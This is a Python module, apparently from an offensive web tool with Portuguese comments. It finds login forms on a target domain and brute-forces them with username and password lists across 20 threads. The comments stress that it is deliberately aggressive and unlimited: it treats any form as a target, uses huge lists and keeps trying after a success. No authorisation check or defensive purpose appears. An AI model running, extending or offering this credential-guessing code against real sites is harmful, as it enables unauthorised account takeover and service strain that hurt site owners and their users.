# modules/auth.py
import concurrent.futures
from urllib.parse import urljoin
from typing import List, Dict, Optional

import requests
from bs4 import BeautifulSoup

from utils import logger
from config import DEFAULT_USERLIST, DEFAULT_PASSLIST

def detectar_login_urls(dominio: str, session: requests.Session, paths: List[str]) -> List[Dict]:
    """
    Varre paths em busca de páginas de login, retornando detalhes.
    Agora é mais agressivo: considera qualquer página com formulário como potencial alvo.
    """
    resultados = []
    base_urls = [f"https://{dominio}", f"http://{dominio}"]

    for path in paths:
        for base in base_urls:
            url = urljoin(base, path)
            try:
                resp = session.get(url, timeout=5, allow_redirects=True)
                if resp.status_code != 200:
                    continue

                soup = BeautifulSoup(resp.text, 'html.parser')
                titulo = soup.title.string.lower() if soup.title else ''
                inputs = soup.find_all('input')
                forms = soup.find_all('form')

                # Critérios ampliados: qualquer formulário com inputs pode ser alvo
                if forms and inputs:
                    # Tenta identificar campos de usuário/senha, mas se não conseguir, usa nomes padrão
                    campos = {}
                    username_field = None
                    password_field = None

                    for inp in inputs:
                        name = inp.get('name')
                        if not name:
                            continue
                        if inp.get('type') == 'password':
                            password_field = name
                        elif name.lower() in ['username', 'user', 'email', 'login']:
                            username_field = name

                    # Se não encontrou, assume nomes comuns
                    if not username_field:
                        username_field = 'username'  # fallback
                    if not password_field:
                        password_field = 'password'  # fallback

                    campos['username_field'] = username_field
                    campos['password_field'] = password_field

                    # Detecta método do formulário
                    metodo = 'POST'
                    if forms:
                        method = forms[0].get('method', 'get').upper()
                        if method in ['GET', 'POST']:
                            metodo = method

                    resultados.append({
                        'url': url,
                        'titulo': titulo[:50],
                        'campos': campos,
                        'metodo': metodo
                    })
            except Exception as e:
                logger.debug(f"Erro ao acessar {url}: {e}")
    return resultados

def brute_force_login(url: str, session: requests.Session, usuario_field: str, senha_field: str,
                      usuarios: List[str] = None, senhas: List[str] = None, metodo='POST') -> List[Dict]:
    """
    Tenta combinações de usuário/senha em uma página de login.
    Agora sem limites: usa listas enormes e não para em caso de sucesso (pode encontrar múltiplas credenciais).
    """
    if usuarios is None:
        usuarios = DEFAULT_USERLIST
    if senhas is None:
        senhas = DEFAULT_PASSLIST

    sucessos = []

    def tentar(user, pwd):
        try:
            if metodo.upper() == 'POST':
                data = {usuario_field: user, senha_field: pwd}
                resp = session.post(url, data=data, timeout=5, allow_redirects=False)
            else:
                params = {usuario_field: user, senha_field: pwd}
                resp = session.get(url, params=params, timeout=5, allow_redirects=False)

            # Critérios de sucesso (ajustáveis)
            if resp.status_code == 302 or 'location' in resp.headers:
                return (user, pwd, 'redirecionamento')
            elif 'logout' in resp.text.lower() or 'dashboard' in resp.text.lower():
                return (user, pwd, 'conteúdo interno')
            elif 'invalid' not in resp.text.lower() and 'falhou' not in resp.text.lower():
                # Pode ser sucesso, mas requer análise manual
                return (user, pwd, 'possível sucesso (verificar)')
            # Se não houver indicação clara, ainda assim pode ser sucesso, mas não registramos
        except Exception as e:
            logger.debug(f"Erro na tentativa {user}:{pwd} - {e}")
        return None

    # Usa um pool de threads grande para acelerar
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
        futuros = {executor.submit(tentar, u, s): (u, s) for u in usuarios for s in senhas}
        for futuro in concurrent.futures.as_completed(futuros):
            resultado = futuro.result()
            if resultado:
                sucessos.append({
                    'usuario': resultado[0],
                    'senha': resultado[1],
                    'indicador': resultado[2]
                })
                # Não interrompe, continua testando outras combinações
    return sucessos